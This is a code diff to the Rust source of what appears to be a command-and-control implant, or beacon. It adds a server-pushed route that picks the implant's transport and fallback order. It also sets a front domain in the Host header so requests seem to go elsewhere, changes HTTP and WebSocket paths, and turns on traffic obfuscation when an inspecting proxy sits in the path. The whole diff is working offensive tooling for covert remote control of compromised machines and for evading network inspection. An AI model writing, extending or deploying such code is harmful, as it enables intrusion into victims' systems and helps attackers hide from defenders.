@@ -9,6 +9,55 @@ use crate::transport::{Channel, HttpChannel, TcpChannel};
 use crate::upk::{self, Value};
 use crate::wire;
 
+/// The route of the agent: which transport it speaks, in which order it may
+/// fall back, and the front domain it hides behind.
+///
+/// The operator knows the network of the target: this one only speaks DNS,
+/// that one goes through a front domain, the third one sits behind a proxy
+/// that reads the traffic.  The server pushes the route with the task
+/// batch, so the beacon follows it without being reconfigured.
+#[derive(Clone, Debug, Default)]
+pub struct Route {
+    /// The transport the beacon uses first.
+    pub primary: String,
+    /// The order the beacon tries when the primary fails.
+    pub fallback: Vec<String>,
+    /// The domain the beacon puts in the Host header.
+    pub front: String,
+    /// The proxy in front of the beacon reads the traffic.
+    pub inspect: bool,
+    /// The route of the HTTP transport, when it is not the default.
+    pub http_path: String,
+    /// The route of the WebSocket transport, when it is not the default.
+    pub ws_path: String,
+}
+
+impl Route {
+    /// The transports the beacon tries, in order.
+    ///
+    /// The route of the server wins over the compiled-in transport; the
+    /// fallback of the route comes after the primary.  A transport the
+    /// beacon does not know is skipped: it cannot speak it.
+    pub fn transports(&self, fallback: Transport) -> Vec<Transport> {
+        let mut out: Vec<Transport> = Vec::new();
+        let mut push = |name: &str| {
+            if let Some(t) = Transport::parse(name) {
+                if !out.contains(&t) {
+                    out.push(t);
+                }
+            }
+        };
+        push(&self.primary);
+        for name in &self.fallback {
+            push(name);
+        }
+        if out.is_empty() {
+            out.push(fallback);
+        }
+        out
+    }
+}
+
 pub const VERSION: &str = env!("CARGO_PKG_VERSION");
 pub const MAX_TASKS_PER_CYCLE: usize = 64;
 /// Control frames (REKEY) tolerated before a TASK_BATCH.
@@ -64,6 +113,9 @@ pub struct Beacon {
     /// It travels in the handshake: the server resolves the chain of a
     /// pivot from it.
     peer_addr: String,
+    /// The route the server pushed: the transport the beacon speaks and
+    /// the order it may fall back in.
+    route: Option<Route>,
 }
 
 impl Beacon {
@@ -86,6 +138,7 @@ impl Beacon {
             wiped_buffers: 0,
             wiped_bytes: 0,
             peer_addr: String::new(),
+            route: None,
         }
     }
 
@@ -229,20 +282,45 @@ impl Beacon {
         // The beacon knows more than one address: when the first server is
         // down, the next one is tried.  A server that moves does not take
         // the implant with it.
+        //
+        // The route of the server decides which transport is tried first
+        // and which ones come after it: the operator knows the network of
+        // the target, the beacon does not.
+        let transports = self.transports();
         let mut last = "no server configured".to_string();
         for server in self.servers() {
-            match self.open_channel_to(&server) {
-                Ok(()) => {
-                    if server != self.cfg.server {
-                        self.log(&format!("using the server {server}"));
-                        self.cfg.server = server;
+            for transport in &transports {
+                match self.open_channel_to(&server, *transport) {
+                    Ok(()) => {
+                        if server != self.cfg.server {
+                            self.log(&format!("using the server {server}"));
+                            self.cfg.server = server;
+                        }
+                        if *transport != self.cfg.transport {
+                            self.log(&format!(
+                                "the route says the server speaks {}",
+                                transport.name()
+                            ));
+                            self.cfg.transport = *transport;
+                        }
+                        return Ok(());
                     }
-                    return Ok(());
+                    Err(e) => last = e,
                 }
-                Err(e) => last = e,
             }
         }
         Err(last)
+    }
+
+    /// The transports the beacon tries, in order.
+    ///
+    /// The route of the server wins over the compiled-in transport; the
+    /// fallback of the route comes after the primary.
+    fn transports(&self) -> Vec<Transport> {
+        match &self.route {
+            Some(route) => route.transports(self.cfg.transport),
+            None => vec![self.cfg.transport],
+        }
     }
 
     /// The addresses the beacon dials, in order.
@@ -259,9 +337,9 @@ impl Beacon {
         out
     }
 
-    /// Open the channel to one address.
-    fn open_channel_to(&mut self, server: &str) -> Result<(), String> {
-        let ch: Box<dyn Channel> = match self.cfg.transport {
+    /// Open the channel to one address with one transport.
+    fn open_channel_to(&mut self, server: &str, transport: Transport) -> Result<(), String> {
+        let ch: Box<dyn Channel> = match transport {
             Transport::Tcp => {
                 let mut c = TcpChannel::new(server);
                 if !self.cfg.proxy.is_empty() {
@@ -443,6 +521,69 @@ impl Beacon {
         }
     }
 
+    /// Apply the route the server pushed.
+    ///
+    /// The route is the road the beacon has to take: the operator knows
+    /// the network of the target, the beacon does not.  A route the
+    /// beacon cannot follow is ignored: the compiled-in transport stays.
+    fn apply_route(&mut self, value: Option<&Value>) {
+        let value = match value {
+            Some(v) => v,
+            None => return,
+        };
+        let primary = value.str_or("primary", "");
+        if primary.is_empty() {
+            return;
+        }
+        let mut fallback: Vec<String> = Vec::new();
+        if let Some(Value::Arr(items)) = value.get("fallback") {
+            for item in items {
+                let name = match item {
+                    Value::Str(s) => s.clone(),
+                    _ => String::new(),
+                };
+                if !name.is_empty() {
+                    fallback.push(name);
+                }
+            }
+        }
+        let route = Route {
+            primary: primary.to_ascii_lowercase(),
+            fallback: fallback
+                .iter()
+                .map(|f| f.to_ascii_lowercase())
+                .collect(),
+            front: value.str_or("front", ""),
+            inspect: value.bool_or("inspect", false),
+            http_path: value.str_or("http_path", ""),
+            ws_path: value.str_or("ws_path", ""),
+        };
+        // The front domain replaces the Host header of the HTTP and the
+        // WebSocket transport: the request goes to the server, but it
+        // looks like it went to the front.
+        if !route.front.is_empty() {
+            self.cfg.http_host_header = route.front.clone();
+            self.cfg.ws_host_header = route.front.clone();
+        }
+        if !route.http_path.is_empty() {
+            self.cfg.http_path = route.http_path.clone();
+        }
+        if !route.ws_path.is_empty() {
+            self.cfg.ws_path = route.ws_path.clone();
+        }
+        if route.inspect {
+            // A proxy that reads the traffic gets a shape that does not
+            // look like a protocol: the beacon keeps the padding on.
+            self.cfg.sleep_obfuscate = true;
+        }
+        self.log(&format!(
+            "the route is now {} (fallback: {})",
+            route.primary,
+            route.fallback.join(", ")
+        ));
+        self.route = Some(route);
+    }
+
     /// The context the tasks get: identity, key and C2 address.
     fn context(&self) -> task::Context {
         task::Context {
@@ -532,6 +673,9 @@ impl Beacon {
         self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
         // The server also decides whether the check-in pattern is obfuscated.
         self.cfg.sleep_obfuscate = batch.bool_or("obf", self.cfg.sleep_obfuscate);
+        // The route of the agent travels with the batch: the beacon learns
+        // which transport it speaks and in which order it may fall back.
+        self.apply_route(batch.get("route"));
 
         let mut tasks = match batch.get("tasks") {
             Some(Value::Arr(items)) => items.clone(),
